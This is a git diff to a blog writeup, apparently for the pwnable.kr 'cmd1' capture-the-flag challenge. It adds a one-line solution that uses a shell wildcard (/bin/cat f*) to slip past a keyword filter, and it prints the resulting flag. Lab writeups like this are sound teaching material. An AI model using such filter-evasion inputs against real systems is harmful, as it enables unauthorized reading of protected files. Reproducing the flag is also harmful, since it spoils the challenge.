@@ -23,6 +23,11 @@ category:  	writeup
 
 ![](/assets/img/writeup/pwn/2017-08-27-pwnable-cmd1/0x00.png)
 
-利用通配符绕过
+利用通配符绕过, getflag~
+
+```
+$ ./cmd1 "/bin/cat f*"
+mommy now I get what PATH environment is for :)
+```
 
 ![](/assets/img/writeup/pwn/2017-08-27-pwnable-cmd1/0x01.png)
